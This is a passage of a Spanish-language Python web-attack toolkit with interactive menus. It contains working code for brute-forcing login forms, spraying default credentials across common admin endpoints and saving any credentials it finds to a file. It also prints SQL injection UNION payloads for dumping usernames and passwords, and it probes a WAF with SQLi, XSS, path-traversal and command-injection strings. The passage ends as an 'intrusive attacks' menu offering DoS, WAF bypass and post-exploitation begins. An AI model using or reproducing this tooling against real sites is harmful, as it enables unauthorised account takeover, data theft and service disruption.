        ("Configuración", "' UNION SELECT config_name,config_value FROM settings--"),
    ]
    
    for desc, payload in ejemplos:
        print(f"\n{Colors.CYAN}[+] {desc}:{Colors.END}")
        print(f"  • {payload}")
    
    print(f"\n{Colors.YELLOW}[+] Técnicas avanzadas:{Colors.END}")
    print(f"  1. GROUP_CONCAT() para múltiples filas")
    print(f"  2. HEX() para binarios")
    print(f"  3. INTO OUTFILE para escribir archivos")
    print(f"  4. LOAD_FILE() para leer archivos")
    
    print(f"\n{Colors.CYAN}[+] Ejemplo GROUP_CONCAT:{Colors.END}")
    print(f"  ' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--")



# ============================
# MÓDULO 5: PRUEBAS DE AUTENTICACIÓN COMPLETAS
# ============================

def menu_autenticacion(objetivo):
    """Menú completo de pruebas de autenticación"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔═══════ PRUEBAS DE AUTENTICACIÓN ═══════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Fuerza Bruta de Login Avanzada      {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Enumeración de Usuarios Avanzada    {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Pruebas de Credenciales Débiles     {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Bypass de Autenticación Avanzado    {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Pruebas de Reset Password Avanzado  {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Análisis de Cookies y Sesiones      {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Pruebas de 2FA/MFA                  {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Password Spraying                   {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal            {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                fuerza_bruta_login_avanzada(objetivo)
            elif opcion == 2:
                enumeracion_usuarios_avanzada(objetivo)
            elif opcion == 3:
                pruebas_credenciales_debiles(objetivo)
            elif opcion == 4:
                bypass_autenticacion_avanzado(objetivo)
            elif opcion == 5:
                pruebas_reset_password_avanzado(objetivo)
            elif opcion == 6:
                analisis_cookies_sesiones(objetivo)
            elif opcion == 7:
                pruebas_2fa_mfa(objetivo)
            elif opcion == 8:
                password_spraying_attack(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def fuerza_bruta_login_avanzada(objetivo):
    """Fuerza bruta avanzada de login"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Fuerza bruta avanzada de login...{Colors.END}")
    
    # Obtener información del login
    login_url = input(f"{Colors.CYAN}[?] URL de login (ej: /login, /wp-login.php): {Colors.END}").strip()
    if not login_url.startswith('/'):
        login_url = '/' + login_url
    
    # Detectar campos del formulario automáticamente
    print(f"{Colors.CYAN}[+] Analizando formulario de login...{Colors.END}")
    
    try:
        respuesta = requests.get(f"{objetivo}{login_url}", verify=False, timeout=10)
        soup = BeautifulSoup(respuesta.text, 'html.parser')
        
        # Buscar formularios
        formularios = soup.find_all('form')
        
        if not formularios:
            print(f"  {Colors.RED}[!] No se encontraron formularios{Colors.END}")
            return
        
        print(f"  {Colors.GREEN}✓{Colors.END} {len(formularios)} formulario(s) encontrado(s)")
        
        # Analizar primer formulario
        form = formularios[0]
        campos = form.find_all(['input', 'textarea', 'select'])
        
        campos_login = []
        for campo in campos:
            nombre = campo.get('name', '')
            tipo = campo.get('type', 'text')
            if nombre and tipo != 'hidden':
                campos_login.append((nombre, tipo))
                print(f"  {Colors.YELLOW}•{Colors.END} Campo: {nombre} (tipo: {tipo})")
        
        if len(campos_login) < 2:
            print(f"  {Colors.RED}[!] Formulario muy simple, puede no ser de login{Colors.END}")
            campos_login = [('username', 'text'), ('password', 'password')]
        
    except Exception as e:
        print(f"  {Colors.RED}[!] Error analizando formulario: {e}{Colors.END}")
        campos_login = [('username', 'text'), ('password', 'password')]
    
    # Configurar ataque
    print(f"\n{Colors.CYAN}[+] Configurando ataque de fuerza bruta...{Colors.END}")
    
    # Cargar usuarios
    usuarios = []
    usar_lista = input(f"{Colors.YELLOW}[?] ¿Usar lista personalizada de usuarios? (s/n): {Colors.END}").lower()
    
    if usar_lista == 's':
        archivo_usuarios = input(f"{Colors.CYAN}[?] Ruta del archivo de usuarios: {Colors.END}").strip()
        try:
            with open(archivo_usuarios, 'r', encoding='utf-8', errors='ignore') as f:
                usuarios = [line.strip() for line in f if line.strip()]
            print(f"  {Colors.GREEN}✓{Colors.END} {len(usuarios)} usuarios cargados")
        except:
            print(f"  {Colors.RED}[!] Error cargando archivo, usando lista por defecto{Colors.END}")
            usuarios = ['admin', 'administrator', 'root', 'test', 'user']
    else:
        usuarios = ['admin', 'administrator', 'root', 'test', 'user', 'guest', 'demo']
    
    # Cargar contraseñas
    contrasenas = []
    usar_lista_pass = input(f"{Colors.YELLOW}[?] ¿Usar lista personalizada de contraseñas? (s/n): {Colors.END}").lower()
    
    if usar_lista_pass == 's':
        archivo_pass = input(f"{Colors.CYAN}[?] Ruta del archivo de contraseñas: {Colors.END}").strip()
        try:
            with open(archivo_pass, 'r', encoding='utf-8', errors='ignore') as f:
                contrasenas = [line.strip() for line in f if line.strip()][:1000]  # Limitar a 1000
            print(f"  {Colors.GREEN}✓{Colors.END} {len(contrasenas)} contraseñas cargadas")
        except:
            print(f"  {Colors.RED}[!] Error cargando archivo, usando lista por defecto{Colors.END}")
            contrasenas = ['admin', 'password', '123456', 'admin123', 'test', 'password123', 'qwerty']
    else:
        contrasenas = ['admin', 'password', '123456', 'admin123', 'test', 'password123', 'qwerty', '12345', '12345678', '123456789']
    
    total_intentos = len(usuarios) * len(contrasenas)
    print(f"  {Colors.CYAN}[+] Total de combinaciones: {total_intentos}{Colors.END}")
    
    if total_intentos > 1000:
        confirmar = input(f"{Colors.YELLOW}[?] ¡Muchos intentos ({total_intentos})! ¿Continuar? (s/n): {Colors.END}").lower()
        if confirmar != 's':
            return
    
    delay = float(input(f"{Colors.CYAN}[?] Delay entre intentos (segundos, 0.5 recomendado): {Colors.END}") or "0.5")
    
    # Iniciar ataque
    print(f"\n{Colors.GREEN}[*] Iniciando fuerza bruta...{Colors.END}")
    
    credenciales_encontradas = []
    intentos = 0
    bloqueos = 0
    
    for usuario in usuarios:
        for contrasena in contrasenas:
            intentos += 1
            
            try:
                # Construir datos del formulario
                datos = {}
                for campo_nombre, campo_tipo in campos_login:
                    if 'user' in campo_nombre.lower() or 'name' in campo_nombre.lower() or 'email' in campo_nombre.lower() or 'login' in campo_nombre.lower():
                        datos[campo_nombre] = usuario
                    elif 'pass' in campo_nombre.lower() or 'pwd' in campo_nombre.lower():
                        datos[campo_nombre] = contrasena
                    else:
                        # Para otros campos, usar valores por defecto
                        if campo_tipo == 'text':
                            datos[campo_nombre] = 'test'
                        elif campo_tipo == 'email':
                            datos[campo_nombre] = 'test@test.com'
                
                # Enviar request
                respuesta = requests.post(f"{objetivo}{login_url}", 
                                        data=datos, 
                                        verify=False, 
                                        timeout=10,
                                        allow_redirects=False)
                
                # Analizar respuesta
                login_exitoso = False
                razon = ""
                
                # Verificar indicadores de login exitoso
                if respuesta.status_code in [200, 302, 303]:
                    # Check 1: Redirección
                    if len(respuesta.history) > 0:
                        login_exitoso = True
                        razon = "Redirección después de login"
                    
                    # Check 2: Cookies de sesión
                    cookies_sesion = ['session', 'auth', 'token', 'jwt', 'access', 'refresh']
                    if any(cookie in respuesta.cookies for cookie in cookies_sesion):
                        login_exitoso = True
                        razon = "Cookie de sesión establecida"
                    
                    # Check 3: Contenido de la página
                    contenido = respuesta.text.lower()
                    indicadores_exito = ['welcome', 'dashboard', 'logout', 'my account', 'perfil', 'cuenta']
                    indicadores_error = ['invalid', 'incorrect', 'error', 'failed', 'incorrecto', 'erróneo']
                    
                    if any(ind in contenido for ind in indicadores_exito):
                        login_exitoso = True
                        razon = "Contenido de página de éxito"
                    elif any(ind in contenido for ind in indicadores_error):
                        razon = "Credenciales incorrectas"
                    else:
                        razon = "Respuesta ambigua"
                
                # Check 4: Tamaño de respuesta diferente
                if len(respuesta.text) > 1000 and 'login' not in respuesta.text.lower():
                    login_exitoso = True
                    razon = "Respuesta grande (posible dashboard)"
                
                if login_exitoso:
                    credenciales_encontradas.append((usuario, contrasena, razon))
                    print(f"\n{Colors.GREEN}[+] ¡CREDENCIALES ENCONTRADAS!{Colors.END}")
                    print(f"  Usuario: {usuario}")
                    print(f"  Contraseña: {contrasena}")
                    print(f"  Razón: {razon}")
                    print(f"  Status: {respuesta.status_code}")
                    
                    # Guardar en archivo
                    with open('credenciales_encontradas.txt', 'a') as f:
                        f.write(f"[{datetime.now()}] {objetivo}\n")
                        f.write(f"Usuario: {usuario}\n")
                        f.write(f"Contraseña: {contrasena}\n")
                        f.write(f"Razón: {razon}\n")
                        f.write("-" * 50 + "\n")
                
                # Mostrar progreso
                if intentos % 10 == 0:
                    print(f"  {Colors.CYAN}[{intentos}/{total_intentos}]{Colors.END} Progreso: {intentos/total_intentos*100:.1f}%")
                
                # Delay entre intentos
                time.sleep(delay)
                
            except requests.exceptions.Timeout:
                print(f"  {Colors.RED}[!] Timeout en intento {intentos}{Colors.END}")
                bloqueos += 1
                if bloqueos > 5:
                    print(f"  {Colors.RED}[!] Demasiados timeouts, deteniendo...{Colors.END}")
                    break
                time.sleep(delay * 2)
            except Exception as e:
                print(f"  {Colors.RED}[!] Error en intento {intentos}: {str(e)[:50]}{Colors.END}")
                time.sleep(delay * 2)
    
    # Resultados finales
    print(f"\n{Colors.GREEN}[+] Fuerza bruta completada{Colors.END}")
    print(f"  Intentos totales: {intentos}")
    print(f"  Credenciales encontradas: {len(credenciales_encontradas)}")
    print(f"  Bloqueos/errores: {bloqueos}")
    
    if credenciales_encontradas:
        print(f"\n{Colors.YELLOW}[!] ACCESO CONSEGUIDO:{Colors.END}")
        for usuario, contrasena, razon in credenciales_encontradas:
            print(f"  {Colors.GREEN}✓{Colors.END} {usuario}:{contrasena} ({razon})")
        
        print(f"\n{Colors.YELLOW}[!] Siguientes pasos:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} Verificar permisos del usuario")
        print(f"  {Colors.CYAN}2.{Colors.END} Explorar funciones accesibles")
        print(f"  {Colors.CYAN}3.{Colors.END} Buscar información sensible")
        print(f"  {Colors.CYAN}4.{Colors.END} Intentar escalada de privilegios")
        print(f"  {Colors.CYAN}5.{Colors.END} Documentar todo el acceso")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron credenciales válidas{Colors.END}")

def pruebas_credenciales_debiles(objetivo):
    """Prueba de credenciales débiles por defecto"""
    print(f"\n{Colors.GREEN}[*] Probando credenciales débiles por defecto...{Colors.END}")
    
    # Credenciales por defecto comunes
    credenciales_por_defecto = [
        # Usuario:Contraseña
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("guest", "guest"),
        ("user", "user"),
        ("demo", "demo"),
        
        # Aplicaciones específicas
        ("admin", ""),  # Contraseña vacía
        ("admin", "admin@123"),
        ("admin", "Admin@123"),
        ("administrator", "Administrator@123"),
        
        # Variaciones
        ("Admin", "Admin"),
        ("ADMIN", "ADMIN"),
        ("admin", "Admin123!"),
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(credenciales_por_defecto)} combinaciones por defecto...{Colors.END}")
    
    encontradas = []
    
    for usuario, contrasena in credenciales_por_defecto:
        try:
            # Intentar login básico
            datos = {
                'username': usuario,
                'password': contrasena,
                'email': usuario,
                'pass': contrasena,
                'user': usuario,
                'pwd': contrasena,
            }
            
            # Probar diferentes endpoints de login
            endpoints = ['/login', '/admin/login', '/wp-login.php', '/administrator', '/user/login']
            
            for endpoint in endpoints:
                try:
                    respuesta = requests.post(f"{objetivo}{endpoint}", 
                                            data=datos, 
                                            verify=False, 
                                            timeout=5,
                                            allow_redirects=False)
                    
                    if respuesta.status_code in [200, 302, 303]:
                        # Verificar login exitoso
                        if 'dashboard' in respuesta.text.lower() or 'logout' in respuesta.text.lower() or 'welcome' in respuesta.text.lower():
                            encontradas.append((usuario, contrasena, endpoint))
                            print(f"  {Colors.GREEN}✓{Colors.END} ¡CREDENCIALES POR DEFECTO ENCONTRADAS!")
                            print(f"     Usuario: {usuario}")
                            print(f"     Contraseña: {contrasena}")
                            print(f"     Endpoint: {endpoint}")
                            break
                except:
                    continue
                
            if encontradas:
                break
                
        except Exception as e:
            print(f"  {Colors.RED}[!] Error probando {usuario}:{contrasena} - {str(e)[:30]}{Colors.END}")
    
    if not encontradas:
        print(f"\n{Colors.RED}[-] No se encontraron credenciales por defecto{Colors.END}")
        print(f"{Colors.YELLOW}[!] Prueba manual adicional:{Colors.END}")
        print(f"  • admin:password123")
        print(f"  • administrator:password")
        print(f"  • root:default")
        print(f"  • test:test123")

# ============================
# MÓDULO 6: ANÁLISIS DE TECNOLOGÍAS COMPLETO
# ============================

def menu_tecnologias(objetivo):
    """Menú completo de análisis de tecnologías"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔══════ ANÁLISIS DE TECNOLOGÍAS AVANZADO ══════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Detección Automática de Tecnologías {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Fingerprinting de Servidor Web      {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Análisis Completo de Headers         {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Detección de Versiones Vulnerables   {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Análisis de Frameworks y Librerías   {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Detección de WAF y Protecciones      {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Análisis de Certificados SSL/TLS     {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Reporte de Tecnologías               {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal             {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                deteccion_automatica_tecnologias(objetivo)
            elif opcion == 2:
                fingerprinting_servidor_web(objetivo)
            elif opcion == 3:
                analisis_completo_headers(objetivo)
            elif opcion == 4:
                deteccion_versiones_vulnerables(objetivo)
            elif opcion == 5:
                analisis_frameworks_librerias(objetivo)
            elif opcion == 6:
                deteccion_waf_protecciones(objetivo)
            elif opcion == 7:
                analisis_certificados_ssl(objetivo)
            elif opcion == 8:
                reporte_tecnologias(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def deteccion_automatica_tecnologias(objetivo):
    """Detección automática de tecnologías"""
    print(f"\n{Colors.GREEN}[*] Detectando tecnologías automáticamente...{Colors.END}")
    
    tecnologias_detectadas = []
    
    try:
        # 1. Obtener respuesta HTTP
        respuesta = requests.get(objetivo, 
                               verify=False, 
                               timeout=10,
                               headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        contenido = respuesta.text.lower()
        headers = respuesta.headers
        
        print(f"{Colors.CYAN}[+] Analizando respuesta HTTP...{Colors.END}")
        
        # 2. Detectar servidor web
        server_header = headers.get('Server', '').lower()
        if server_header:
            print(f"  {Colors.GREEN}✓{Colors.END} Servidor web: {headers['Server']}")
            tecnologias_detectadas.append(('Servidor Web', headers['Server']))
        
        # 3. Detectar CMS
        cms_patterns = {
            'WordPress': ['wp-content', 'wordpress', 'xmlrpc.php', '/wp-includes/', '/wp-admin/'],
            'Joomla': ['joomla', 'media/jui', 'index.php?option=', '/media/system/'],
            'Drupal': ['drupal', 'sites/all', 'misc/drupal.js', '/core/assets/'],
            'Magento': ['magento', '/skin/frontend/', '/js/mage/'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Odoo': ['odoo', 'web/assets', 'web/static/lib'],
            'Laravel': ['laravel', 'csrf-token', '/storage/framework/'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'React': ['react', 'react-dom', '__next', 'create-react-app'],
            'Vue.js': ['vue', 'vue.js', '__vue__'],
            'Angular': ['angular', 'ng-', 'zone.js'],
        }
        
        print(f"\n{Colors.CYAN}[+] Detectando CMS/Frameworks...{Colors.END}")
        for cms, patterns in cms_patterns.items():
            for pattern in patterns:
                if pattern in contenido:
                    tecnologias_detectadas.append(('CMS/Framework', cms))
                    print(f"  {Colors.GREEN}✓{Colors.END} {cms} detectado")
                    break
        
        # 4. Detectar tecnologías por headers
        x_powered = headers.get('X-Powered-By', '')
        if x_powered:
            print(f"  {Colors.GREEN}✓{Colors.END} X-Powered-By: {x_powered}")
            tecnologias_detectadas.append(('Powered By', x_powered))
        
        # 5. Detectar JavaScript libraries
        js_libraries = {
            'jQuery': ['jquery', 'jquery.min.js'],
            'Bootstrap': ['bootstrap', 'bootstrap.min.js'],
            'Font Awesome': ['font-awesome', 'fa-'],
            'Google Analytics': ['google-analytics', 'ga.js', 'analytics.js'],
            'reCAPTCHA': ['recaptcha', 'grecaptcha'],
            'Stripe': ['stripe.com', 'js.stripe.com'],
            'PayPal': ['paypal.com', 'paypalobjects.com'],
        }
        
        print(f"\n{Colors.CYAN}[+] Detectando librerías JavaScript...{Colors.END}")
        for lib, patterns in js_libraries.items():
            for pattern in patterns:
                if pattern in contenido:
                    tecnologias_detectadas.append(('JS Library', lib))
                    print(f"  {Colors.GREEN}✓{Colors.END} {lib}")
                    break
        
        # 6. Analizar URLs de recursos
        print(f"\n{Colors.CYAN}[+] Analizando URLs de recursos...{Colors.END}")
        
        # Buscar URLs en el contenido
        import re
        urls = re.findall(r'(https?://[^\s<>"\']+|/[^\s<>"\']+\.(?:js|css|png|jpg|gif))', contenido)
        
        recursos_interesantes = {
            '.min.js': 'JavaScript minificado',
            '.min.css': 'CSS minificado',
            '.php': 'PHP',
            '.aspx': 'ASP.NET',
            '.jsp': 'JSP',
            '.do': 'Struts',
            '.action': 'Struts2',
            '.rails': 'Ruby on Rails',
            '.py': 'Python',
            '/api/': 'API Endpoint',
            '/rest/': 'REST API',
            '/graphql': 'GraphQL',
            '/websocket': 'WebSocket',
            '/socket.io': 'Socket.io',
        }
        
        for url in urls[:20]:  # Limitar a 20 URLs
            for patron, desc in recursos_interesantes.items():
                if patron in url.lower():
                    print(f"  {Colors.YELLOW}•{Colors.END} {desc}: {url[:80]}...")
                    tecnologias_detectadas.append(('Recurso', f"{desc}: {url[:50]}"))
                    break
        
        # 7. Resumen
        print(f"\n{Colors.GREEN}[+] Detección completada{Colors.END}")
        print(f"  {len(tecnologias_detectadas)} tecnologías detectadas")
        
        if tecnologias_detectadas:
            print(f"\n{Colors.YELLOW}[+] Resumen de tecnologías:{Colors.END}")
            for categoria, tecnologia in set(tecnologias_detectadas):  # Usar set para eliminar duplicados
                print(f"  {Colors.CYAN}•{Colors.END} {categoria}: {tecnologia}")
        
        # 8. Guardar resultados
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archivo = f"tecnologias_{urlparse(objetivo).netloc}_{timestamp}.txt"
        
        with open(archivo, 'w') as f:
            f.write(f"Reporte de tecnologías - {objetivo}\n")
            f.write(f"Fecha: {datetime.now()}\n")
            f.write("="*50 + "\n\n")
            for categoria, tecnologia in set(tecnologias_detectadas):
                f.write(f"{categoria}: {tecnologia}\n")
        
        print(f"\n{Colors.CYAN}[+] Resultados guardados en: {archivo}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error en detección: {e}{Colors.END}")

def deteccion_waf_protecciones(objetivo):
    """Detección de WAF y protecciones"""
    print(f"\n{Colors.GREEN}[*] Detectando WAF y protecciones...{Colors.END}")
    
    wafs_detectados = []
    protecciones = []
    
    try:
        # 1. Headers de seguridad
        respuesta = requests.get(objetivo, verify=False, timeout=10)
        headers = respuesta.headers
        
        print(f"{Colors.CYAN}[+] Analizando headers de seguridad...{Colors.END}")
        
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'Content-Security-Policy': 'Content Security Policy',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'X-Content-Type-Options': 'MIME sniffing prevention',
            'X-XSS-Protection': 'XSS protection',
            'Referrer-Policy': 'Referrer control',
            'Feature-Policy': 'Feature policy',
            'Permissions-Policy': 'Permissions policy',
        }
        
        for header, desc in security_headers.items():
            if header in headers:
                print(f"  {Colors.GREEN}✓{Colors.END} {header}: Presente - {desc}")
                protecciones.append(f"{header}: {headers[header]}")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {header}: Ausente")
        
        # 2. Detectar WAF específico
        print(f"\n{Colors.CYAN}[+] Detectando WAF específico...{Colors.END}")
        
        waf_patterns = {
            'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
            'Cloudfront': ['cloudfront', 'x-amz-cf-'],
            'Akamai': ['akamai', 'x-akamai-'],
            'Imperva': ['imperva', 'incap_ses_', 'visid_incap_'],
            'F5 BIG-IP': ['bigip', 'f5', 'x-wa-info'],
            'Barracuda': ['barracuda'],
            'Fortinet': ['fortigate'],
            'Sucuri': ['sucuri'],
            'Wordfence': ['wordfence'],
            'ModSecurity': ['mod_security'],
        }
        
        for waf, patterns in waf_patterns.items():
            for pattern in patterns:
                if pattern in str(headers).lower() or pattern in respuesta.text.lower():
                    wafs_detectados.append(waf)
                    print(f"  {Colors.GREEN}✓{Colors.END} WAF detectado: {waf}")
                    break
        
        # 3. Pruebas activas de WAF
        print(f"\n{Colors.CYAN}[+] Realizando pruebas activas de WAF...{Colors.END}")
        
        test_payloads = [
            ("SQL Injection básica", "' OR '1'='1"),
            ("XSS básico", "<script>alert(1)</script>"),
            ("Path traversal", "../../../etc/passwd"),
            ("Command injection", "; ls -la"),
        ]
        
        for nombre, payload in test_payloads:
            try:
                test_url = f"{objetivo}/?test={quote(payload)}"
                test_resp = requests.get(test_url, verify=False, timeout=5)
                
                if test_resp.status_code in [403, 406, 418, 429]:
                    print(f"  {Colors.YELLOW}⚠{Colors.END} {nombre}: BLOQUEADO ({test_resp.status_code}) - Posible WAF")
                    protecciones.append(f"WAF bloqueó: {nombre}")
                elif test_resp.status_code == 200:
                    print(f"  {Colors.GREEN}✓{Colors.END} {nombre}: Permitido")
                else:
                    print(f"  {Colors.YELLOW}?{Colors.END} {nombre}: {test_resp.status_code}")
                    
            except Exception as e:
                print(f"  {Colors.RED}✗{Colors.END} {nombre}: Error - {str(e)[:30]}")
        
        # 4. Rate limiting test
        print(f"\n{Colors.CYAN}[+] Probando rate limiting...{Colors.END}")
        try:
            start_time = time.time()
            requests_made = 0
            
            for i in range(10):
                try:
                    requests.get(objetivo, verify=False, timeout=2)
                    requests_made += 1
                    time.sleep(0.1)
                except:
                    break
            
            elapsed = time.time() - start_time
            
            if requests_made < 5:
                print(f"  {Colors.YELLOW}⚠{Colors.END} Rate limiting detectado: solo {requests_made}/10 requests exitosas")
                protecciones.append(f"Rate limiting activo")
            else:
                print(f"  {Colors.GREEN}✓{Colors.END} Sin rate limiting aparente: {requests_made}/10 requests")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Error en rate limiting test: {str(e)[:30]}")
        
        # 5. Resumen
        print(f"\n{Colors.GREEN}[+] Análisis de protecciones completado{Colors.END}")
        
        if wafs_detectados:
            print(f"{Colors.YELLOW}[+] WAFs detectados:{Colors.END}")
            for waf in set(wafs_detectados):
                print(f"  {Colors.RED}•{Colors.END} {waf}")
        
        if protecciones:
            print(f"\n{Colors.YELLOW}[+] Protecciones encontradas:{Colors.END}")
            for proteccion in set(protecciones):
                print(f"  {Colors.CYAN}•{Colors.END} {proteccion}")
        
        if not wafs_detectados and len(protecciones) < 3:
            print(f"\n{Colors.RED}[-] Pocas protecciones detectadas{Colors.END}")
            print(f"{Colors.YELLOW}[!] Recomendaciones:{Colors.END}")
            print(f"  • Implementar WAF (Cloudflare, ModSecurity)")
            print(f"  • Configurar headers de seguridad")
            print(f"  • Habilitar rate limiting")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error en análisis: {e}{Colors.END}")



# ============================
# MÓDULO 7: ATAQUES INTRUSIVOS
# ============================

def menu_ataques_intrusivos(objetivo):
    """Menú de ataques intrusivos (CRÍTICO)"""
    if not disclaimer_intrusivo():
        return
    
    while True:
        print(f"\n{Colors.RED}{Colors.BOLD}╔═════════════ ATAQUES INTRUSIVOS ═════════════╗{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Denial of Service (DoS) Testing        {Colors.RED}{Colors.BOLD}   ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Fuerza Bruta Avanzada                 {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Bypass de WAF/Antivirus               {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Ataques de Inyección de Código        {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Explotación de Vulnerabilidades       {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Ataques a Bases de Datos              {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} Escalada de Privilegios               {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Post-Explotación                      {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal              {Colors.RED}{Colors.BOLD}    ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                dos_testing(objetivo)
            elif opcion == 2:
                fuerza_bruta_avanzada(objetivo)
            elif opcion == 3:
                waf_bypass(objetivo)
            elif opcion == 4:
                code_injection_ataques(objetivo)
            elif opcion == 5:
                explotacion_vulnerabilidades(objetivo)
            elif opcion == 6:
                ataques_bases_datos(objetivo)
            elif opcion == 7:
                escalada_privilegios(objetivo)
            elif opcion == 8:
                post_explotacion(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

def dos_testing(objetivo):
    """Pruebas de Denial of Service"""
    print(f"\n{Colors.RED}[!] ¡ADVERTENCIA EXTREMA! PRUEBAS DE DoS{Colors.END}")
    print(f"{Colors.RED}[!] Puede causar interrupción de servicio{Colors.END}")
    
